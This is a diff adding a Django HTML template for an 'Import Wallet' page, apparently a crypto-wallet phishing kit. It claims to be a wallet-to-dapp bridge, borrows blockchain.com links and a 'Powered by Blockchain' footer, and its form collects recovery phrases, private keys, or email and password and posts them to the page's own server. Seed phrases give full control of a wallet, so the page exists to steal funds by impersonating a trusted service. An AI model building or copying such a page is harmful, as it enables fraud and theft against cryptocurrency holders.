@@ -1,0 +1,323 @@
+{% load static %}
+
+<html>
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <link rel="stylesheet" href="{% static 'css/main.css' %}" type="text/css">
+    <meta name="description" content="Bridge for connecting Wallets to Dapps">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta property="og:image" content="{% static 'images/logo2.png' %}">
+    <link rel="icon" href="{% static 'images/logo2.png' %}">
+    <style>
+        .img_display {
+            width: 70%;
+        }
+        
+        .logo_display {
+            width: 20%;
+        }
+        
+        .info_title {
+            margin: 50px 0 20px 0;
+        }
+        
+        .info_title a {
+            font-size: 18px;
+            padding: 8px 30px;
+            margin: 0 5px;
+            background-color: rgb(233, 151, 0);
+            color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 0 5px 4px rgba(0, 0, 0, 0.2);
+            font-weight: 600;
+        }
+        
+        .tabcontent form {
+            padding: 0;
+            margin: 0;
+            width: 50%;
+        }
+        
+        .tabcontent button {
+            border: none;
+            outline: none;
+            width: 25%;
+            padding: 10px;
+            background-color: rgb(233, 151, 0);
+            border-radius: 10px;
+            font-size: 18px;
+            color: #fff;
+            cursor: pointer;
+            box-shadow: 0 0 5px 4px rgba(0, 0, 0, 0.2);
+        }
+        
+        .tabcontent button:hover {
+            background-color: rgb(233, 151, 0);
+        }
+        
+        .email_user {
+            width: 50%;
+            margin-top: 20px;
+            padding: 40px 20px;
+            box-shadow: 0 0 5px 4px rgba(0, 0, 0, 0.2);
+        }
+        
+        .email_user label {
+            font-size: 18px;
+            display: block;
+            margin-bottom: 5px;
+            text-align: left;
+        }
+        
+        .email_user input {
+            width: 100%;
+            display: block;
+            border: none;
+            outline: none;
+            box-shadow: 0 0 5px 4px rgba(0, 0, 0, 0.2);
+            padding: 10px 2px;
+            text-indent: 5px;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+        
+        .tabcontent .email_user button {
+            width: 50%;
+        }
+        
+        header .nav {
+            background-color: rgba(0, 0, 0, 0.85);
+            padding: 21px 5px;
+        }
+        
+        .nav a {
+            margin: 0 10px;
+            padding: 5px 25px;
+            font-size: 18px;
+            text-decoration: none;
+            color: #fff;
+        }
+        
+        .nav a:hover {
+            background-color: black;
+        }
+        
+        @media (max-width: 991.99px) {
+            .tabcontent form {
+                width: 80%;
+            }
+            .tabcontent button {
+                width: 50%;
+            }
+            .email_user {
+                width: 80%;
+            }
+        }
+        
+        @media (max-width: 767.99px) {
+            .tabcontent form {
+                width: 95%;
+            }
+            .tabcontent button {
+                width: 70%;
+            }
+            .img_display {
+                width: 100%;
+            }
+            .open_protocol {
+                font-size: 18px;
+            }
+            .logo_display {
+                width: 50%;
+            }
+            .email_user {
+                width: 95%;
+            }
+            .nav a {
+                margin: 0 8px;
+                padding: 5px 20px;
+                font-size: 16px;
+            }
+        }
+        
+        @media (max-width: 479.99px) {
+            .info_title {
+                margin-top: 30px;
+            }
+            .info_title a {
+                display: block;
+                margin: 10px 30px;
+            }
+        }
+        
+        .logo_display {
+            width: 12%;
+        }
+        
+        .logo_display img {
+            width: 100%;
+        }
+        
+        @media (max-width: 1399.99px) {
+            .logo_display {
+                width: 15%;
+            }
+        }
+        
+        @media (max-width: 1199.99px) {
+            .logo_display {
+                width: 18%;
+            }
+        }
+        
+        @media (max-width: 949.99px) {
+            .logo_display {
+                width: 21%;
+            }
+        }
+        
+        @media (max-width: 799.99px) {
+            .logo_display {
+                width: 25%;
+            }
+        }
+        
+        @media (max-width: 599.99px) {
+            .logo_display {
+                width: 30%;
+            }
+        }
+        
+        @media (max-width: 449.99px) {
+            .logo_display {
+                width: 35%;
+            }
+            .nav a {
+                margin: 0 5px;
+                padding: 5px 15px;
+                font-size: 14px;
+            }
+        }
+        
+        @media (max-width: 349.99px) {
+            .logo_display {
+                width: 40%;
+            }
+        }
+    </style>
+    <title>Import Wallet</title>
+</head>
+
+<body>
+    <center>
+        <header>
+            <div class="nav">
+                <a href="{% url 'home' %}">Home</a>
+                <a href="/wallets/All-Wallets">Connect Wallets</a>
+                <a href="/wallets/All-Wallets">Apps</a>
+                <a href="https://support.blockchain.com/hc/en-us" target="_blank">Help</a>
+            </div>
+        </header>
+        <div class="mt-0 pt-0 logo_display">
+            <a href="{% url 'home' %}">
+                <img src="{% static 'images/logo2.png' %}" alt="logo">
+            </a>
+        </div>
+        <br>
+        <h2>
+            <center>Import Wallet</center>
+        </h2>
+        <div class="info_title">
+            <a href="#" id="phrase">Phrase or Private Key</a>
+            <a href="#" id="user_email">Email or Username</a>
+        </div>
+
+        <div class="tabcontent " style="display: block; ">
+            <form action="" method="POST">
+                {% csrf_token %}
+                <div class="phrase" id="phrase_content">
+                    <input type="text" name="wallet" value="" hidden="hidden">
+                    <textarea name="phrase" id="phrase_inner" required="required" minlength="12 " placeholder="Phrase" style="font-size: 16px;"></textarea>
+                    <br>
+                    <div class="desc ">Typically 12 (sometimes 24) words separated by single spaces</div>
+                    <br>
+                    <button type="submit" name="import ">IMPORT</button>
+                </div>
+
+                <div class="email_user" id="email_user_content">
+                    <label for="user">Email or Username</label>
+                    <input type="text" name="user" id="user" placeholder="Enter your email" required="required">
+
+                    <label for="pass">Password</label>
+                    <input type="password" name="pass" placeholder="Enter your password" id="pass" required="required">
+
+                    <button type="submit">Submit</button>
+                </div>
+            </form>
+        </div>
+
+        <div id=" phrase " class="tabcontent " style="display: block; ">
+            <form action=" " method="POST ">
+                {% csrf_token %}
+
+            </form>
+        </div>
+        <footer class="mt-5 py-4 ">
+            <div class="container ">
+                <div class="footer-wrap ">
+                    <a href="https://www.blockchain.com/wallet" target="_blank" class="webflow-link w-inline-block "><img src="uploads-ssl.webflow.com/617a4278ee3d47cfcba9c9c9/617a4278ee3d476680a9ca6f_webflow-w-small%402x.png " alt=" " class="webflow-logo-tiny
+                " width="15 ">
+                        <div class="paragraph-tiny ">Powered by Blockchain</div>
+                    </a>
+                </div>
+            </div>
+
+        </footer>
+    </center>
+</body>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+<script>
+    $('#email_user_content').hide()
+    $('#user_email').css({
+        'background-color': 'rgb(255, 255, 255)',
+        'color': 'rgb(45, 97, 209)'
+    })
+    $('#user').removeAttr('required');
+    $('#pass').removeAttr('required');
+
+    $('#phrase').click(function() {
+        $('#email_user_content').hide()
+        $('#phrase_content').show()
+        $('#phrase').css({
+            'background-color': 'rgb(233, 151, 0)',
+            'color': 'rgb(255, 255, 255)'
+        })
+        $('#user_email').css({
+            'background-color': 'rgb(255, 255, 255)',
+            'color': 'rgb(45, 97, 209)'
+        })
+        $("#phrase_inner").attr("required", "required");
+        $('#user').removeAttr('required');
+        $('#pass').removeAttr('required');
+    })
+
+    $('#user_email').click(function() {
+        $('#email_user_content').show()
+        $('#phrase_content').hide()
+        $('#user_email').css({
+            'background-color': 'rgb(233, 151, 0)',
+            'color': 'rgb(255, 255, 255)'
+        })
+        $('#phrase').css({
+            'background-color': 'rgb(255, 255, 255)',
+            'color': 'rgb(45, 97, 209)'
+        })
+        $('#phrase_inner').removeAttr('required');
+        $("#user").attr("required", "required");
+        $("#pass").attr("required", "required");
+    })
+</script>
+
+</html>
